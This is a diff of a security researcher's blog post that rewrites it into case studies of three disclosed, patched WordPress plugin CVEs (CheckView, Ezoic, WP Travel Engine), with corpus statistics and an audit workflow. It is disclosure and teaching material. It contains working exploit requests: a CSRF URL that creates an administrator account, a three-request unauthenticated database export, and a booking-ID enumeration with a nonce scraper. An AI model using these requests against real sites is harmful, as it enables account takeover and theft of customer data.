@@ -5,8 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self' mailto:; upgrade-insecure-requests">
 <meta name="referrer" content="strict-origin-when-cross-origin">
-<title>59 CVEs: what WordPress plugins get wrong · Usama Arshad</title>
-<meta name="description" content="A data-backed study of 51 catalogued WordPress plugin CVEs: 53% unauthenticated, 49% data disclosure, and one recurring root cause behind.">
+<title>A year of WordPress plugin research · Usama Arshad</title>
+<meta name="description" content="Three published WordPress CVEs taken apart request by request, plus the corpus behind them and the one missing line they all share.">
 <link rel="canonical" href="https://www.usamaarshad.me/blog/59-cves-wordpress-permission-callback/">
 <link rel="alternate" type="application/rss+xml" title="Usama Arshad, Writing" href="/feed.xml">
 <link rel="icon" href="/assets/favicon.ico">
@@ -14,22 +14,22 @@
 <meta name="theme-color" content="#131110">
 <meta property="og:type" content="article">
 <meta property="og:site_name" content="Usama Arshad">
-<meta property="og:title" content="Fifty-nine CVEs in one year: what WordPress plugins keep getting wrong">
-<meta property="og:description" content="A data-backed study of 51 catalogued WordPress plugin CVEs: 53% unauthenticated, 49% data disclosure, and one recurring root cause behind.">
+<meta property="og:title" content="A year of WordPress plugin research: three bugs, one root cause">
+<meta property="og:description" content="Three published WordPress CVEs taken apart request by request, plus the corpus behind them and the one missing line they all share.">
 <meta property="og:url" content="https://www.usamaarshad.me/blog/59-cves-wordpress-permission-callback/">
 <meta property="og:image" content="https://www.usamaarshad.me/assets/og.jpg">
 <meta property="article:published_time" content="2026-11-04">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:creator" content="@usama0x01">
-<meta name="twitter:title" content="Fifty-nine CVEs in one year: what WordPress plugins keep getting wrong">
-<meta name="twitter:description" content="A data-backed study of 51 catalogued WordPress plugin CVEs: 53% unauthenticated, 49% data disclosure, and one recurring root cause behind.">
+<meta name="twitter:title" content="A year of WordPress plugin research: three bugs, one root cause">
+<meta name="twitter:description" content="Three published WordPress CVEs taken apart request by request, plus the corpus behind them and the one missing line they all share.">
 <meta name="twitter:image" content="https://www.usamaarshad.me/assets/og.jpg">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "BlogPosting",
-  "headline": "Fifty-nine CVEs in one year: what WordPress plugins keep getting wrong",
-  "description": "A data-backed study of 51 catalogued WordPress plugin CVEs: 53% unauthenticated, 49% data disclosure, and one recurring root cause behind.",
+  "headline": "A year of WordPress plugin research: three bugs, one root cause",
+  "description": "Three published WordPress CVEs taken apart request by request, plus the corpus behind them and the one missing line they all share.",
   "datePublished": "2026-11-04",
   "dateModified": "2026-11-04",
   "author": {
@@ -80,8 +80,8 @@
       <div class="hero-deck">
         <div class="deck-copy" data-reveal style="--d:.08s">
           <p class="kicker">Writing</p>
-          <h1 class="hero-title" id="pt">Fifty-nine CVEs in one year: what WordPress plugins keep getting wrong<span class="dot">.</span></h1>
-          <p class="deck">I spent a year reporting WordPress plugin vulnerabilities through WPScan. Fifty-nine CVE IDs later, the same mistake keeps showing up in three different costumes.</p>
+          <h1 class="hero-title" id="pt">A year of WordPress plugin research: three bugs, one root cause<span class="dot">.</span></h1>
+          <p class="deck">Three published CVEs taken apart request by request: an unauthenticated administrator account, a full database export in three HTTP calls, and an IDOR that hands you other people's bookings. Then the corpus behind them, and why they are all the same bug.</p>
           <p class="wu-meta"><span class="cat">WordPress</span><span class="cat">AppSec</span><span class="cat">Vulnerability Research</span><span class="cat">REST API</span><span class="sep">·</span><span>4 November 2026</span></p>
         </div>
       </div>
@@ -90,12 +90,154 @@
   <section class="section">
     <div class="container">
       <div class="wu-layout">
-        <article class="wu" data-reveal><section id="the-corpus"><h2><span class="hn">01</span>The corpus</h2>
-<p>Between late 2024 and November 2026 I reported WordPress plugin vulnerabilities through WPScan under coordinated disclosure. That run produced <strong>59 assigned CVE IDs</strong>, of which <strong>51 are catalogued publicly</strong> on my <a href="/research/">research page</a> and 55 advisories are live. It also put me <a href="https://wpscan.com/leaderboard/" target="_blank" rel="noopener">9th on the WPScan researcher leaderboard</a>.</p>
-<p>That is a large enough sample to stop telling anecdotes and start counting. So I counted. Here is what 51 vulnerabilities across <strong>46 distinct plugins</strong> actually look like when you line them up.</p>
-<div class="tldr"><p class="lab">The short version</p><p>Half of these bugs are the same bug. A plugin exposes an endpoint, carefully verifies that the request is <em>well-formed</em> and that the user is <em>logged in</em>, and never checks whether that particular user is allowed to do that particular thing to that particular object.</p></div>
-</section><section id="what-the-numbers-say"><h2><span class="hn">02</span>What the numbers say</h2>
-<p>Breaking the 51 down by vulnerability class:</p>
+        <article class="wu" data-reveal><section id="where-this-started"><h2><span class="hn">01</span>Where this started</h2>
+<p>I started pulling WordPress plugins apart in my own time because the economics are absurd. A plugin with 100,000 active installations is written by one or two people, ships on a two-week cadence, and sits in front of customer records, booking data and payment metadata. The attack surface is enormous and the review budget is roughly zero.</p>
+<p>A year of that, reported through WPScan under coordinated disclosure, produced <strong>59 assigned CVE IDs</strong> across <strong>46 distinct plugins</strong>. This post is not a list. It is three of them taken apart properly, because the pattern only becomes obvious once you have seen the same mistake wearing three different outfits.</p>
+<p>Everything below is public. All three are patched, the advisories are live, and the vendors shipped fixes before any of it was written down. Nothing here works against an updated site.</p>
+<div class="tldr"><p class="lab">The pattern, up front</p><p>A plugin exposes an endpoint. It carefully verifies that the request is <em>well formed</em> and that somebody is <em>logged in</em>. It never checks whether <em>that particular user</em> is allowed to do <em>that particular thing</em> to <em>that particular object</em>. Everything below is a variation on that sentence.</p></div>
+</section><section id="case-one-checkview-an-administrator-account-from-a-marker-string"><h2><span class="hn">02</span>Case one: CheckView, an administrator account from a marker string</h2>
+<p class="codelabel">CVE-2026-18786 · CVSS 8.8 High · CWE-287 · affected 2.0.29 to 2.3.1 · fixed in 2.3.2</p>
+<p>CheckView is an automated testing plugin for WooCommerce and form plugins. Like most plugins with a REST API, it needs its own endpoints to authenticate differently from core WordPress, because its backend calls in from outside a browser session.</p>
+<p>The standard way to do that is to hook <code>rest_authentication_errors</code>, look at the request, and decide whether to let it through. CheckView did exactly that. The problem is <em>how</em> it decided.</p>
+
+<h3>The root cause</h3>
+<p>The filter asked one question: does the request URI contain this plugin's namespace string? If yes, it discarded the authentication error and let the request proceed. It never checked which route was actually being dispatched.</p>
+<figure class="meme"><div class="meme-card"><p class="meme-cap top">THE FILTER ASKS: IS MY PLUGIN'S NAME IN THE URL?</p><svg viewBox="0 0 560 200" role="img" xmlns="http://www.w3.org/2000/svg">
+<rect width="560" height="200" fill="#100e0d"/>
+<text x="280" y="34" fill="#6f6659" font-family="monospace" font-size="10" text-anchor="middle" letter-spacing="2">THE FILTER ASKS ONE QUESTION</text>
+<rect x="60" y="52" width="440" height="40" fill="none" stroke="#6f6659" stroke-width="1.2"/>
+<text x="280" y="77" fill="#d6cfc3" font-family="monospace" font-size="11" text-anchor="middle">does REQUEST_URI contain "checkview/v1" ?</text>
+<path d="M280 92v22" stroke="#6f6659" stroke-width="1.2"/>
+<path d="M275 108l5 6 5-6" fill="none" stroke="#6f6659" stroke-width="1.2"/>
+<rect x="60" y="118" width="440" height="40" fill="none" stroke="#e5484d" stroke-width="1.5"/>
+<text x="280" y="143" fill="#e5484d" font-family="monospace" font-size="11" text-anchor="middle">yes -&gt; discard the authentication error</text>
+<text x="280" y="184" fill="#6f6659" font-family="monospace" font-size="9" text-anchor="middle" letter-spacing="2">IT NEVER ASKS WHICH ROUTE YOU ACTUALLY CALLED</text>
+</svg><p class="meme-cap bot">THE ROUTER ASKS: WHICH ROUTE DID YOU CALL? THEY DISAGREE.</p></div></figure>
+<p>That is the whole bug. The authentication filter and the REST router were reading two different things out of the same request. The filter looked at the raw <code>REQUEST_URI</code> as a string. The router resolved the actual route. Put the plugin's namespace somewhere in the URI that the router ignores, and the filter waves you through to a route that has nothing to do with the plugin.</p>
+<p>In shape, the vulnerable logic looked like this. Treat it as a reconstruction of the behaviour described in the advisory rather than verbatim vendor source:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>add_filter( 'rest_authentication_errors', function ( $result ) {
+    // "is my plugin mentioned anywhere in this URL?"
+    if ( strpos( $_SERVER['REQUEST_URI'], 'checkview/v1' ) !== false ) {
+        return null;          // <-- discards the error for ANY route
+    }
+    return $result;
+} );</code></pre></figure>
+<p>Returning <code>null</code> from <code>rest_authentication_errors</code> means "no opinion, carry on". For the plugin's own routes that is intended. For <code>/wp-json/wp/v2/users</code> it is a catastrophe, because the thing it discards is the nonce failure that would otherwise stop a cross-site request.</p>
+
+<h3>The exploit</h3>
+<p>Three pieces have to line up:</p>
+<ol class="steps">
+<li>An <strong>invalid nonce</strong> on the request, so that core raises the authentication error the filter is about to throw away.</li>
+<li>A <strong>throwaway query parameter</strong> containing the plugin's REST namespace, so the marker check matches. It does not matter which parameter; the router never reads it.</li>
+<li>An <strong>administrator's session cookie</strong>, supplied by the victim's own browser when they visit the attacker's page.</li>
+</ol>
+<p>WordPress accepts <code>_method=POST</code> on a <code>GET</code> request as a method override, so the whole thing fits in a URL an administrator can be made to visit:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>GET /wp-json/wp/v2/users?_method=POST
+    &_wpnonce=INVALIDNONCE
+    &username=cvpwn
+    &email=cvpwn@example.com
+    &password=Str0ngPass!123
+    &roles[]=administrator
+    &cv=/wp-json/checkview/v1          <-- the marker; the router ignores it
+HTTP/1.1
+Host: victim.example
+Cookie: wordpress_logged_in_<hash>=<the admin's own session></code></pre></figure>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>HTTP/1.1 201 Created
+Location: https://victim.example/wp-json/wp/v2/users/42
+
+{"id":42,"username":"cvpwn","roles":["administrator"]}</code></pre></figure>
+<p>The <code>cv=</code> parameter is doing all the work and means nothing. It exists purely so that <code>strpos()</code> returns a non-false value. The route being dispatched is core's user-creation endpoint, which is protected by exactly one thing in this flow, and that one thing has just been discarded.</p>
+<p>The advisory notes the same trigger works with plain permalinks and with the marker in the path rather than the query string. There is no single magic URL to filter on, which is why the fix had to be in the logic rather than in a WAF rule.</p>
+
+<h3>Why it scores 8.8</h3>
+<p>It needs an administrator to visit a page, which is why it is not a 9.8. Everything after that is unconditional: a new administrator account, persistent, under attacker control, on a site the attacker never authenticated to. From there it is plugin upload, which is code execution.</p>
+<p>The fix in 2.3.2 restricts the filter to the plugin's own resolved routes, which is what it should have been doing from the first commit.</p>
+</section><section id="case-two-ezoic-a-full-database-export-in-three-requests"><h2><span class="hn">03</span>Case two: Ezoic, a full database export in three requests</h2>
+<p class="codelabel">CVE-2026-18789 · CVSS 7.5 High · CWE-862 · affected 2.6.35 to 2.23.0 · fixed in 2.23.1</p>
+<p>This one needs no victim, no cookie and no interaction. Three unauthenticated HTTP requests, in order, and you have the users table.</p>
+<figure class="meme"><div class="meme-card"><p class="meme-cap top">THREE REQUESTS. NO CREDENTIALS. NO CLICKS.</p><svg viewBox="0 0 560 210" role="img" xmlns="http://www.w3.org/2000/svg">
+<rect width="560" height="210" fill="#100e0d"/>
+<g font-family="monospace" font-size="9" letter-spacing="1">
+<rect x="26" y="66" width="140" height="56" fill="none" stroke="#d6cfc3" stroke-width="1.3"/>
+<text x="96" y="90" fill="#d6cfc3" text-anchor="middle">POST /ezoic-emote</text>
+<text x="96" y="106" fill="#6f6659" text-anchor="middle">v1/export/initiate</text>
+<text x="96" y="52" fill="#6f6659" text-anchor="middle">1 · COMMENTS LEAK</text>
+
+<rect x="210" y="66" width="140" height="56" fill="none" stroke="#d6cfc3" stroke-width="1.3"/>
+<text x="280" y="90" fill="#d6cfc3" text-anchor="middle">X-Ezoic-CMS: true</text>
+<text x="280" y="106" fill="#6f6659" text-anchor="middle">option flipped</text>
+<text x="280" y="52" fill="#6f6659" text-anchor="middle">2 · MODULE ENABLED</text>
+
+<rect x="394" y="66" width="140" height="56" fill="none" stroke="#e5484d" stroke-width="1.6"/>
+<text x="464" y="90" fill="#e5484d" text-anchor="middle">POST /ezoic-cms</text>
+<text x="464" y="106" fill="#e5484d" text-anchor="middle">v1/export/initiate</text>
+<text x="464" y="52" fill="#e5484d" text-anchor="middle">3 · FULL DATABASE</text>
+</g>
+<path d="M172 94h32M356 94h32" stroke="#6f6659" stroke-width="1.3"/>
+<path d="M198 89l6 5-6 5M382 89l6 5-6 5" fill="none" stroke="#6f6659" stroke-width="1.3"/>
+<text x="280" y="160" fill="#e5484d" font-family="monospace" font-size="10" text-anchor="middle" letter-spacing="2">wp_users.csv · password hashes · reset tokens · auth salts</text>
+<text x="280" y="182" fill="#6f6659" font-family="monospace" font-size="9" text-anchor="middle" letter-spacing="2">THREE UNAUTHENTICATED REQUESTS</text>
+</svg><p class="meme-cap bot">THE THIRD ONE RETURNS WP_USERS.CSV</p></div></figure>
+
+<h3>Request one: the export that was never gated</h3>
+<p>The plugin registers an export endpoint intended for its own integration, with no authorization check on the route:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>POST /wp-json/ezoic-emote/v1/export/initiate HTTP/1.1
+Host: victim.example
+Content-Type: application/json
+
+{}</code></pre></figure>
+<p>That alone exports comment data: author emails, IP addresses, comment metadata. Already a disclosure finding, already reportable. But the interesting part is what else the endpoint touches.</p>
+
+<h3>Request two: flipping a site option with a header</h3>
+<p>The same handler inspects a request header and, if present, persistently enables the plugin's CMS module by writing a site option. An unauthenticated request gets to change site configuration:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>POST /wp-json/ezoic-emote/v1/export/initiate HTTP/1.1
+Host: victim.example
+X-Ezoic-CMS: true
+
+{}</code></pre></figure>
+<p>Nothing in the response signals that anything important happened. The option is now set, and it stays set.</p>
+
+<h3>Request three: the part that matters</h3>
+<p>Enabling the CMS module registers a second export route with a much wider scope. It is now reachable, and it is gated by the same amount of authorization as the first one:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>POST /wp-json/ezoic-cms/v1/export/initiate HTTP/1.1
+Host: victim.example
+Content-Type: application/json
+
+{}</code></pre></figure>
+<p>This exports the database. Per the advisory, that includes:</p>
+<ul class="bullets">
+<li><code>wp_users.csv</code>, with <strong>password hashes and password-reset tokens</strong></li>
+<li><code>wp_options.csv</code>, which contains the authentication keys and salts</li>
+<li>Comment tables with emails and IP addresses</li>
+<li>The remaining tables</li>
+</ul>
+<p>Reset tokens are the detail that turns this from a bad day into a takeover. A hash needs cracking; a valid reset token needs a single request. And the salts in <code>wp_options</code> let an attacker forge authentication cookies directly.</p>
+<p>The final problem is where the exports land. If the output directory is inside the web root, the attacker does not even need the export response body. They fetch the CSV.</p>
+<div class="tldr"><p class="lab">What makes this a chain rather than three bugs</p><p>Individually, each request looks like a medium. Request one leaks comments. Request two flips an option. Request three is only reachable because of request two. Triage that reads each endpoint in isolation scores this a 5 and moves on. The severity lives in the ordering.</p></div>
+</section><section id="case-three-wp-travel-engine-other-people-s-bookings"><h2><span class="hn">04</span>Case three: WP Travel Engine, other people&#x27;s bookings</h2>
+<p class="codelabel">CVE-2026-16737 · CVSS 6.5 Medium · CWE-639 · fixed in 6.8.5</p>
+<p>The textbook IDOR, included because it shows how a plugin can get authorization right in one place and wrong in another, in the same codebase, for the same data.</p>
+<p>WP Travel Engine handles trip bookings. The <code>wte_add_trip_to_cart</code> AJAX action takes a booking identifier and returns the booking. It validates a nonce. It does not check who owns the booking.</p>
+
+<h3>Step one: get a nonce</h3>
+<p>The nonce is not a secret. It is printed into every public trip page so that anonymous visitors can add trips to a cart:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>curl -s https://victim.example/trip/some-public-trip/ \
+  | grep -oE 'wte[_-]?nonce["\x27]?\s*[:=]\s*["\x27][a-f0-9]+' | head -1</code></pre></figure>
+
+<h3>Step two: walk the IDs</h3>
+<p>Booking identifiers are WordPress post IDs, which are sequential. There is nothing to guess:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: victim.example
+Content-Type: application/x-www-form-urlencoded
+
+action=wte_add_trip_to_cart&nonce=<from the public page>&booking_id=1337</code></pre></figure>
+<p>The response comes back with the billing details, traveller names, trip costs and dates belonging to whoever actually made booking 1337. Increment and repeat for the whole customer base.</p>
+
+<h3>The part that proves it was an oversight</h3>
+<p>The plugin also exposes the same booking data through a REST route, and <em>that</em> route enforces authorization correctly. It returns <code>401</code>. Somebody understood the requirement, implemented it properly once, and the AJAX path never got the same treatment.</p>
+<p>This is the most common shape in my corpus. Not an absence of security awareness, but an inconsistency between two code paths to the same resource. If you are reviewing a plugin, enumerate every path to a given object and compare them against each other. The gaps are where two developers, or one developer two years apart, disagreed.</p>
+</section><section id="the-corpus-behind-the-three"><h2><span class="hn">05</span>The corpus behind the three</h2>
+<p>Those three are not special. They are representative. Of the 51 CVEs I have catalogued publicly so far, sorted by class:</p>
 <figure class="datatable">
 <table>
 <thead><tr><th>Class</th><th class="n">Count</th><th class="n">Share</th></tr></thead>
@@ -109,20 +251,54 @@
 <tr><td>Open redirect / resource exhaustion</td><td class="n">2</td><td class="n">4%</td></tr>
 </tbody></table>
 </figure>
-<p>And by the access level an attacker needs:</p>
+<p>And by the access an attacker needs before they start:</p>
 <figure class="datatable">
 <table>
 <thead><tr><th>Required access</th><th class="n">Count</th></tr></thead>
 <tbody>
-<tr><td><b>Unauthenticated</b></td><td class="n">27</td></tr>
+<tr><td><b>None at all</b></td><td class="n">27</td></tr>
 <tr><td>Subscriber or above</td><td class="n">11</td></tr>
 <tr><td>Contributor or above</td><td class="n">5</td></tr>
 <tr><td>Author or above</td><td class="n">3</td></tr>
-<tr><td>Vendor / other</td><td class="n">5</td></tr>
+<tr><td>Vendor or other</td><td class="n">5</td></tr>
 </tbody></table>
 </figure>
-<p><strong>53% need no account at all.</strong> Another 22% need only a Subscriber account, which on any site with open registration is the same thing as unauthenticated with one extra HTTP request. Put those together and roughly three quarters of these bugs are reachable by someone who walked in off the street.</p>
-<p>The severity distribution is the part people get wrong about this category of research. Most of these are not remote code execution. They are a booking system that returns other customers' bookings, a gift-card plugin that returns live card codes and buyer PII, a directory plugin that returns the users table. Individually unglamorous; collectively, a breach notification.</p>
+<p>Fifty-three percent require no account. Another 22% need only a Subscriber, which on any site with open registration is the same thing plus one HTTP request. Roughly three quarters are reachable by someone who walked in off the street.</p>
+<p>Almost none of these are remote code execution, and that is the point people miss about this category. A booking plugin that returns other customers' bookings is not a dramatic finding. It is a regulatory one. Twenty-five of these are a disclosure notification waiting for someone to notice.</p>
+</section><section id="the-same-bug-in-three-costumes"><h2><span class="hn">06</span>The same bug in three costumes</h2>
+<p>Strip the three case studies down and they are the same sentence. The costume depends on which WordPress API the developer reached for.</p>
+
+<h3>Costume one: the REST route with no permission callback</h3>
+<p><code>register_rest_route()</code> takes a <code>permission_callback</code>, and since WordPress 5.5 omitting it throws a notice. The notice is easy to silence in the worst possible way:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>// Ships more often than you would like
+register_rest_route( 'myplugin/v1', '/export', array(
+    'methods'             => 'GET',
+    'callback'            => 'myplugin_export_everything',
+    'permission_callback' => '__return_true',   // notice silenced, door opened
+) );</code></pre></figure>
+<p><code>__return_true</code> is not a permission check. It is the absence of one, spelled in a way that survives code review because it looks like a decision. That is Ezoic's shape.</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>'permission_callback' => function ( WP_REST_Request $req ) {
+    return current_user_can( 'export', (int) $req['id'] );
+},</code></pre></figure>
+
+<h3>Costume two: the nopriv hook nobody took back out</h3>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>add_action( 'wp_ajax_get_booking',        'plugin_get_booking' );  // logged in
+add_action( 'wp_ajax_nopriv_get_booking', 'plugin_get_booking' );  // anyone</code></pre></figure>
+<p>The <code>_nopriv_</code> variant exists for genuinely public actions. It gets copy-pasted onto handlers that read private data while someone debugs a logged-out edge case, and it never comes back out. The handler is usually fine for its intended caller; it simply never imagined an unintended one.</p>
+
+<h3>Costume three: the nonce mistaken for a permission</h3>
+<p>The subtlest and the most common, and the one underneath WP Travel Engine. The code looks defensive:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>function plugin_update_item() {
+    check_ajax_referer( 'plugin_nonce', 'security' );   // looks like a check
+    $id = (int) $_POST['id'];
+    update_post_meta( $id, 'price', $_POST['price'] );  // ...of what, exactly?
+    wp_send_json_success();
+}</code></pre></figure>
+<p>A nonce proves the request came from a page your site rendered. It says nothing about whether this user may touch item <code>$id</code>. Any logged-in Subscriber can load a page that mints a valid nonce and then point the request at somebody else's object. <code>check_ajax_referer</code> appearing in a function is evidence that somebody thought about CSRF, which is a different attack.</p>
+<p>The missing line, in all thirteen broken-access-control findings:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>if ( ! current_user_can( 'edit_post', $id ) ) {
+    wp_send_json_error( null, 403 );
+}</code></pre></figure>
 <figure class="meme"><div class="meme-card"><p class="meme-cap top">A PLUGIN SECURITY AUDIT, APPARENTLY</p><svg viewBox="0 0 560 210" role="img" xmlns="http://www.w3.org/2000/svg">
 <rect width="560" height="210" fill="#100e0d"/>
 <text x="90" y="40" fill="#6f6659" font-family="monospace" font-size="11" letter-spacing="2">THE PLUGIN CHECKED:</text>
@@ -138,63 +314,35 @@
 </g>
 <path d="M84 150h400" stroke="#e5484d" stroke-width="1" opacity=".35"/>
 </svg><p class="meme-cap bot">THREE OUT OF FOUR IS NOT A PASSING GRADE</p></div></figure>
-</section><section id="one-mistake-three-costumes"><h2><span class="hn">03</span>One mistake, three costumes</h2>
-<p>Nearly every access-control finding in the corpus reduces to the same confusion: <strong>authentication is not authorisation, and a nonce is neither.</strong> It just wears a different outfit depending on which WordPress API the developer reached for.</p>
-
-<h3>Costume one: the REST route with no permission callback</h3>
-<p>Eight of the catalogued CVEs live on REST routes. <code>register_rest_route()</code> takes a <code>permission_callback</code>, and since WordPress 5.5 omitting it throws a notice. The notice is easy to silence in the worst possible way:</p>
-<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>// The bug, in the wild, more than once
-register_rest_route( 'myplugin/v1', '/export', array(
-    'methods'             => 'GET',
-    'callback'            => 'myplugin_export_everything',
-    'permission_callback' => '__return_true',   // notice silenced, door opened
-) );</code></pre></figure>
-<p>That is literally how an unauthenticated database export ships. <code>__return_true</code> is not a permission check; it is the absence of one, spelled in a way that passes code review because it looks like a decision.</p>
-<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>// What it has to be
-'permission_callback' => function ( WP_REST_Request $req ) {
-    return current_user_can( 'export', (int) $req['id'] );
-},</code></pre></figure>
-
-<h3>Costume two: the nopriv AJAX handler</h3>
-<p>Ten of the findings sit on <code>admin-ajax.php</code> handlers. WordPress makes you register two hooks, and the second one is a loaded gun:</p>
-<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>add_action( 'wp_ajax_get_booking',        'plugin_get_booking' );  // logged in
-add_action( 'wp_ajax_nopriv_get_booking', 'plugin_get_booking' );  // ANYONE</code></pre></figure>
-<p>The <code>_nopriv_</code> variant exists for genuinely public actions, and it gets copy-pasted onto handlers that read private data because the developer was debugging a logged-out edge case and never took it back out. The handler itself is usually fine for its intended caller. It simply never imagined an unintended one.</p>
-
-<h3>Costume three: the nonce that was mistaken for a permission</h3>
-<p>This is the subtlest and the most common. The code looks defensive:</p>
-<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>function plugin_update_item() {
-    check_ajax_referer( 'plugin_nonce', 'security' );   // looks like a check!
-    $id = (int) $_POST['id'];
-    update_post_meta( $id, 'price', $_POST['price'] );  // ...of what, exactly?
-    wp_send_json_success();
-}</code></pre></figure>
-<p>A nonce proves the request came from a page your site rendered for this user. It says nothing about whether this user may touch item <code>$id</code>. Any logged-in Subscriber can load a page that mints a valid nonce, then point the request at somebody else's object. That is the entire mechanism behind the IDOR findings in this corpus, and it is why <code>check_ajax_referer</code> appearing in a function is not evidence that the function is safe. It is evidence that the developer thought about CSRF, which is a different attack.</p>
-<p>The fix is one line, and it is the line that is missing from 13 of these CVEs:</p>
-<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>if ( ! current_user_can( 'edit_post', $id ) ) {
-    wp_send_json_error( null, 403 );
-}</code></pre></figure>
-</section><section id="finding-them"><h2><span class="hn">04</span>Finding them</h2>
-<p>None of this requires exotic tooling. The workflow that produced the corpus is boring on purpose, which is why it scales:</p>
+</section><section id="how-i-actually-find-these"><h2><span class="hn">07</span>How I actually find these</h2>
+<p>The workflow is deliberately boring, which is why it scales to 46 plugins:</p>
 <ol class="steps">
-<li><strong>Enumerate the surface.</strong> Grep the plugin for <code>register_rest_route</code>, <code>wp_ajax_nopriv_</code>, <code>add_action( 'admin_post_nopriv_</code>, and <code>add_shortcode</code>. That list is the attack surface, and it is usually under thirty entries.</li>
-<li><strong>For each entry, ask one question.</strong> Not "is this sanitised" but "which user is allowed to call this, and where is that enforced?" If the answer is a nonce check, you have probably found a bug.</li>
-<li><strong>Reproduce locally.</strong> A local WordPress with the plugin installed, two accounts (Subscriber and Administrator), and a logged-out browser. Call the endpoint as all three.</li>
-<li><strong>Deduplicate before reporting.</strong> Check NVD, the WPScan database and Patchstack for the plugin and version. Reporting a known bug burns your credibility and the triager's afternoon.</li>
-<li><strong>Report privately, publish nothing.</strong> WPScan handles vendor coordination and CVE assignment. Nothing goes public until a fix ships.</li>
+<li><strong>Enumerate the surface.</strong> Grep for the four things that create entry points. That list is usually under thirty lines and it is the entire attack surface.
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">shell</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>grep -rn "register_rest_route"      --include=*.php .
+grep -rn "wp_ajax_nopriv_"          --include=*.php .
+grep -rn "admin_post_nopriv_"       --include=*.php .
+grep -rn "add_shortcode"            --include=*.php .</code></pre></figure>
+</li>
+<li><strong>For each entry, ask one question.</strong> Not "is this sanitised" but "which user is allowed to call this, and where is that enforced?" If the answer is a nonce check, you have probably found a bug. If the answer is <code>__return_true</code>, you have definitely found one.</li>
+<li><strong>Diff the paths to the same object.</strong> WP Travel Engine got it right over REST and wrong over AJAX. Where two code paths reach one resource, compare them.</li>
+<li><strong>Reproduce locally.</strong> A local WordPress, the plugin, three browser profiles: logged out, Subscriber, Administrator. Call every endpoint as all three. The diff between the first and the third is your finding.</li>
+<li><strong>Deduplicate before reporting.</strong> Check NVD, the WPScan database and Patchstack for the plugin and version first. Reporting a known bug costs you credibility and the triager an afternoon.</li>
+<li><strong>Report privately and publish nothing.</strong> WPScan handles vendor coordination and CVE assignment. Nothing goes public until the fix ships, which is why this post exists now and not in August.</li>
 </ol>
-<p>Search-engine reconnaissance narrows step one considerably. I keep the queries I actually use in a <a href="/dorks/">public dork library</a>; the WordPress section at the top is the one that fed this research.</p>
-</section><section id="if-you-ship-a-plugin"><h2><span class="hn">05</span>If you ship a plugin</h2>
-<p>Four things, in descending order of how much grief they will save you:</p>
+<p>Search-engine reconnaissance narrows step one a lot. The queries I actually use are in my <a href="/dorks/">public dork library</a>; the WordPress section at the top is the one that feeds this research.</p>
